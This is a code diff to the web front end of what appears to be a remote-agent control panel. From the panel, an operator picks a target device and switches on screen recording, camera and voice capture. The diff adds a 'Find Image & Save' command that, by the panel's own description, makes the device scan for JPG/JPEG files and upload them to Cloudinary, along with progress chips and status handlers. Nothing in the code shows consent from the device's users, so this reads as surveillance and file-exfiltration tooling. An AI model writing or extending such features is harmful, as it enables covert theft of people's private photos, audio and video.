@@ -345,7 +345,7 @@
         }
 
         #video-list.empty::before {
-            content: 'No recordings yet. New videos appear here automatically.';
+            content: 'No uploads yet. New video, audio and image links appear here.';
             display: block;
             color: var(--muted);
             padding: 14px;
@@ -552,8 +552,10 @@
                     <div id="recording-chip" class="status-chip unknown">Recording: Unknown</div>
                     <div id="camera-chip" class="status-chip unknown">Camera: Unknown</div>
                     <div id="voice-chip" class="status-chip unknown">Voice: Unknown</div>
+                    <div id="image-sync-chip" class="status-chip unknown">Image Sync: Unknown</div>
                 </div>
                 <div id="control-feedback" class="control-feedback"></div>
+                <div id="image-sync-feedback" class="control-feedback"></div>
             </div>
 
             <div class="action-group">
@@ -568,6 +570,13 @@
                 <div class="action-grid">
                     <button id="btn-start-voice" class="btn-cam" onclick="sendControl('admin_start_voice')">Voice On</button>
                     <button id="btn-stop-voice" class="btn-stop" onclick="sendControl('admin_stop_voice')">Voice Off</button>
+                </div>
+                <div class="action-grid">
+                    <button id="btn-start-image-sync" class="btn-all" type="button">Find Image &amp; Save</button>
+                    <button id="btn-stop-image-sync" class="btn-stop" type="button">Stop Image Sync</button>
+                </div>
+                <div class="action-grid" style="margin-top:10px; grid-template-columns: 1fr;">
+                    <button id="btn-refresh-image-sync" class="btn-cam" type="button">Refresh Image Sync Status</button>
                 </div>
                 <hr class="divider">
                 <div class="action-grid">
@@ -662,7 +671,9 @@
         const recordingChip = document.getElementById('recording-chip');
         const cameraChip = document.getElementById('camera-chip');
         const voiceChip = document.getElementById('voice-chip');
+        const imageSyncChip = document.getElementById('image-sync-chip');
         const controlFeedbackEl = document.getElementById('control-feedback');
+        const imageSyncFeedbackEl = document.getElementById('image-sync-feedback');
         const previewFeedbackEl = document.getElementById('preview-feedback');
         const startRecBtn = document.getElementById('btn-start-rec');
         const stopRecBtn = document.getElementById('btn-stop-rec');
@@ -670,6 +681,9 @@
         const stopCamBtn = document.getElementById('btn-stop-cam');
         const startVoiceBtn = document.getElementById('btn-start-voice');
         const stopVoiceBtn = document.getElementById('btn-stop-voice');
+        const startImageSyncBtn = document.getElementById('btn-start-image-sync');
+        const stopImageSyncBtn = document.getElementById('btn-stop-image-sync');
+        const refreshImageSyncBtn = document.getElementById('btn-refresh-image-sync');
         const localRecordStartBtn = document.getElementById('btn-local-rec-start');
         const localRecordStopBtn = document.getElementById('btn-local-rec-stop');
         const snapshotBtn = document.getElementById('btn-snapshot');
@@ -746,6 +760,11 @@
         function setControlFeedback(message, type = '') {
             controlFeedbackEl.className = `control-feedback ${type}`.trim();
             controlFeedbackEl.innerText = message;
+        }
+
+        function setImageSyncFeedback(message, type = '') {
+            imageSyncFeedbackEl.className = `control-feedback ${type}`.trim();
+            imageSyncFeedbackEl.innerText = message;
         }
 
         function setPreviewFeedback(message, type = '') {
@@ -1035,12 +1054,82 @@
             chip.innerText = `${label}: Unknown`;
         }
 
+        function setImageSyncChipState(state, online) {
+            imageSyncChip.classList.remove('on', 'off', 'unknown');
+
+            if (!online) {
+                imageSyncChip.classList.add('unknown');
+                imageSyncChip.innerText = 'Image Sync: Unknown';
+                return;
+            }
+
+            const totalFiles = Number(state?.imageSyncTotalFiles || 0);
+            const nextIndex = Number(state?.imageSyncNextIndex || 0);
+            const progressText = totalFiles > 0 ? `${Math.min(nextIndex, totalFiles)}/${totalFiles}` : '0/0';
+
+            if (state?.imageSyncRunning) {
+                imageSyncChip.classList.add('on');
+                imageSyncChip.innerText = `Image Sync: Running ${progressText}`;
+                return;
+            }
+
+            if (totalFiles > 0 || nextIndex > 0) {
+                imageSyncChip.classList.add('off');
+                imageSyncChip.innerText = `Image Sync: Idle ${progressText}`;
+                return;
+            }
+
+            imageSyncChip.classList.add('off');
+            imageSyncChip.innerText = 'Image Sync: Ready';
+        }
+
+        function parseImageSyncProgress(payload = {}) {
+            const totalFiles = Number(payload.totalFiles ?? payload.total ?? 0) || 0;
+            const nextIndex = Number(payload.nextIndex ?? payload.index ?? 0) || 0;
+            return { totalFiles, nextIndex };
+        }
+
+        function mergeImageSyncState(agentId, payload = {}) {
+            if (!agentId) {
+                return null;
+            }
+
+            const previous = agentRuntimeState[agentId] || {};
+            const stage = String(payload.stage || previous.imageSyncStage || '');
+            const { totalFiles, nextIndex } = parseImageSyncProgress(payload);
+
+            let running = previous.imageSyncRunning;
+            if (typeof payload.running === 'boolean') {
+                running = payload.running;
+            } else if (stage) {
+                if (['started', 'queued', 'scanning', 'retrying', 'stopping'].includes(stage)) {
+                    running = true;
+                }
+                if (['completed', 'failed', 'stopped', 'idle'].includes(stage)) {
+                    running = false;
+                }
+            }
+
+            agentRuntimeState[agentId] = {
+                ...previous,
+                imageSyncRunning: Boolean(running),
+                imageSyncStage: stage,
+                imageSyncNextIndex: totalFiles > 0 ? Math.min(nextIndex, totalFiles) : nextIndex,
+                imageSyncTotalFiles: totalFiles,
+                imageSyncUpdatedAt: Date.now(),
+                online: previous.online !== false
+            };
+
+            return agentRuntimeState[agentId];
+        }
+
         function updateControlButtons(state, online) {
             const hasDevice = Boolean(selectedAgentId);
             const canControl = hasDevice && online;
             const isRecording = Boolean(state?.recording);
             const isCameraOn = Boolean(state?.cameraOn);
             const isVoiceRecording = Boolean(state?.voiceRecording);
+            const isImageSyncRunning = Boolean(state?.imageSyncRunning);
 
             startRecBtn.disabled = !canControl || isRecording;
             stopRecBtn.disabled = !canControl || !isRecording;
@@ -1048,6 +1137,9 @@
             stopCamBtn.disabled = !canControl || !isCameraOn;
             startVoiceBtn.disabled = !canControl || isVoiceRecording;
             stopVoiceBtn.disabled = !canControl || !isVoiceRecording;
+            startImageSyncBtn.disabled = !canControl || isImageSyncRunning;
+            stopImageSyncBtn.disabled = !canControl || !isImageSyncRunning;
+            refreshImageSyncBtn.disabled = !canControl;
         }
 
         function updateRuntimeStateUI() {
@@ -1055,6 +1147,7 @@
                 setChipState(recordingChip, 'Recording', null);
                 setChipState(cameraChip, 'Camera', null);
                 setChipState(voiceChip, 'Voice', null);
+                setImageSyncChipState(null, false);
                 updateControlButtons(null, false);
                 return;
             }
@@ -1065,6 +1158,7 @@
             setChipState(recordingChip, 'Recording', isOnline ? state?.recording : null);
             setChipState(cameraChip, 'Camera', isOnline ? state?.cameraOn : null);
             setChipState(voiceChip, 'Voice', isOnline ? state?.voiceRecording : null);
+            setImageSyncChipState(state, isOnline);
             updateControlButtons(state, isOnline);
         }
 
@@ -1544,6 +1638,18 @@
             publishRelease(true);
         });
 
+        startImageSyncBtn.addEventListener('click', () => {
+            sendImageSyncStart(false);
+        });
+
+        stopImageSyncBtn.addEventListener('click', () => {
+            sendControl('admin_stop_image_sync');
+        });
+
+        refreshImageSyncBtn.addEventListener('click', () => {
+            requestSelectedImageSyncStatus();
+        });
+
         releaseFileInputEl.addEventListener('change', () => {
             const selectedFile = releaseFileInputEl.files?.[0];
             const detectedVersion = extractVersionFromFileName(selectedFile?.name || '');
@@ -1588,6 +1694,46 @@
             setControlFeedback('Command sent. Waiting for device confirmation...', 'pending');
         }
 
+        function sendImageSyncStart(forceRescan = false) {
+            if (!socket.connected) {
+                setControlFeedback('Please login first to send controls.', 'warn');
+                return;
+            }
+
+            if (!selectedAgentId) {
+                alert('Please select a target device first.');
+                return;
+            }
+
+            if (!agentRuntimeState[selectedAgentId]?.online) {
+                alert('Selected device is offline.');
+                return;
+            }
+
+            socket.emit('admin_find_image_and_save', { targetId: selectedAgentId, forceRescan: Boolean(forceRescan) });
+            setImageSyncFeedback('Image sync command sent. Device will scan JPG/JPEG and upload to Cloudinary.', 'pending');
+        }
+
+        function requestSelectedImageSyncStatus() {
+            if (!socket.connected) {
+                setControlFeedback('Please login first to send controls.', 'warn');
+                return;
+            }
+
+            if (!selectedAgentId) {
+                alert('Please select a target device first.');
+                return;
+            }
+
+            if (!agentRuntimeState[selectedAgentId]?.online) {
+                alert('Selected device is offline.');
+                return;
+            }
+
+            socket.emit('admin_get_image_sync_status', { targetId: selectedAgentId });
+            setImageSyncFeedback('Fetching current image sync progress...', 'pending');
+        }
+
         function formatControlAction(action = '') {
             switch (String(action || '')) {
                 case 'start_capture':
@@ -1602,6 +1748,12 @@
                     return 'Voice recording on';
                 case 'stop_voice_capture':
                     return 'Voice recording off';
+                case 'find_image_and_save':
+                    return 'Find image and save';
+                case 'stop_image_sync':
+                    return 'Stop image sync';
+                case 'get_image_sync_status':
+                    return 'Image sync status refresh';
                 default:
                     return 'Command';
             }
@@ -1627,6 +1779,26 @@
             }, 2000);
         }
 
+        function formatImageSyncStatusMessage(data = {}) {
+            const stage = String(data.stage || 'unknown');
+            const machine = data.machine || 'Unknown-PC';
+            const totalFiles = Number(data.totalFiles ?? data.total ?? 0) || 0;
+            const nextIndex = Number(data.nextIndex ?? data.index ?? 0) || 0;
+            const progressText = totalFiles > 0 ? ` (${Math.min(nextIndex, totalFiles)}/${totalFiles})` : '';
+            const filePath = data.filePath ? ` | ${data.filePath}` : '';
+            return `[${machine}] image-sync: ${stage}${progressText}${filePath}`;
+        }
+
+        function getImageSyncFeedbackType(stage = '') {
+            if (['failed'].includes(stage)) {
+                return 'warn';
+            }
+            if (['completed', 'idle'].includes(stage)) {
+                return 'ok';
+            }
+            return 'pending';
+        }
+
         function renderAgents(agents) {
             const activeIds = new Set(agents.map((agent) => agent.id));
 
@@ -1637,10 +1809,15 @@
             });
 
             agents.forEach((agent) => {
+                const previous = agentRuntimeState[agent.id] || {};
                 agentRuntimeState[agent.id] = {
+                    ...previous,
                     recording: Boolean(agent.recording),
                     cameraOn: Boolean(agent.cameraOn),
                     voiceRecording: Boolean(agent.voiceRecording),
+                    imageSyncRunning: Boolean(agent.imageSyncRunning),
+                    imageSyncNextIndex: Number(agent.imageSyncNextIndex || 0),
+                    imageSyncTotalFiles: Number(agent.imageSyncTotalFiles || 0),
                     online: true,
                     updatedAt: Date.now()
                 };
@@ -1660,6 +1837,7 @@
                 agentSelect.appendChild(option);
                 selectedDeviceEl.innerText = 'Selected device: none';
                 setControlFeedback('No active device connected.', 'warn');
+                setImageSyncFeedback('', '');
                 setCameraImage('');
                 updateRuntimeStateUI();
                 return;
@@ -1678,6 +1856,9 @@
             const selectedLabel = agentSelect.options[agentSelect.selectedIndex]?.text || 'none';
             selectedDeviceEl.innerText = `Selected device: ${selectedLabel}`;
             updateRuntimeStateUI();
+            if (selectedAgentId && socket.connected) {
+                requestSelectedImageSyncStatus();
+            }
         }
 
         agentSelect.addEventListener('change', () => {
@@ -1686,7 +1867,11 @@
             selectedDeviceEl.innerText = `Selected device: ${selectedLabel}`;
             setCameraImage('');
             setControlFeedback('', '');
+            setImageSyncFeedback('', '');
             updateRuntimeStateUI();
+            if (selectedAgentId && socket.connected) {
+                requestSelectedImageSyncStatus();
+            }
         });
 
         socket.on('update_agent_list', (agents) => {
@@ -1707,6 +1892,7 @@
             }
 
             agentRuntimeState[data.agentId] = {
+                ...(agentRuntimeState[data.agentId] || {}),
                 recording: Boolean(data.recording),
                 cameraOn: Boolean(data.cameraOn),
                 voiceRecording: Boolean(data.voiceRecording),
@@ -1725,6 +1911,7 @@
                 const voiceText = data.voiceRecording ? 'Voice ON' : 'Voice OFF';
                 const feedbackType = data.online === false ? 'warn' : 'ok';
                 setControlFeedback(`${recordingText} • ${cameraText}`, feedbackType);
+                setImageSyncFeedback(voiceText, feedbackType);
             }
         });
 
@@ -1756,6 +1943,7 @@
 
         socket.on('connect', () => {
             setStatus(`Connected: ${socket.id}`, 'connected');
+            socket.emit('admin_get_image_sync_status');
         });
 
         socket.on('connect_error', (err) => {
@@ -1769,6 +1957,7 @@
             });
             updateRuntimeStateUI();
             setControlFeedback('Connection lost. Waiting to reconnect...', 'warn');
+            setImageSyncFeedback('Connection lost. Waiting to reconnect...', 'warn');
         });
 
         socket.on('new_video_link', (data) => {
@@ -1776,10 +1965,45 @@
             link.href = data.url;
             link.target = '_blank';
             link.rel = 'noopener noreferrer';
-            const mediaLabel = data.mediaType === 'audio' ? 'Audio' : 'Video';
+            const mediaLabel = data.mediaType === 'audio'
+                ? 'Audio'
+                : data.mediaType === 'image'
+                    ? 'Image'
+                    : 'Video';
             link.innerText = `${mediaLabel} from ${data.machine} - ${new Date().toLocaleTimeString()}`;
             videoList.prepend(link);
             updateVideoEmptyState();
+        });
+
+        socket.on('ui_image_sync_status', (data = {}) => {
+            const merged = mergeImageSyncState(data.agentId, data);
+            if (!merged) {
+                return;
+            }
+
+            if (selectedAgentId === data.agentId) {
+                updateRuntimeStateUI();
+                const stage = String(data.stage || 'unknown');
+                setImageSyncFeedback(formatImageSyncStatusMessage(data), getImageSyncFeedbackType(stage));
+            }
+        });
+
+        socket.on('ui_image_sync_snapshot', (data = {}) => {
+            const merged = mergeImageSyncState(data.agentId, {
+                ...data,
+                running: typeof data.running === 'boolean' ? data.running : undefined,
+                stage: data.running ? 'started' : 'idle'
+            });
+
+            if (!merged) {
+                return;
+            }
+
+            if (selectedAgentId === data.agentId) {
+                updateRuntimeStateUI();
+                const stage = data.running ? 'started' : 'idle';
+                setImageSyncFeedback(formatImageSyncStatusMessage({ ...data, stage }), getImageSyncFeedbackType(stage));
+            }
         });
 
         socket.on('ui_update_broadcast_sent', (data = {}) => {
@@ -1966,6 +2190,7 @@
                         setReleaseFeedback('Login to publish agent releases.', 'pending');
                         setAuthUI(false);
                         renderAgents([]);
+                        setImageSyncFeedback('', '');
                         videoList.innerHTML = '';
                         updateVideoEmptyState();
                         setAuthFeedback('Please login with Firebase email/password.', 'pending');
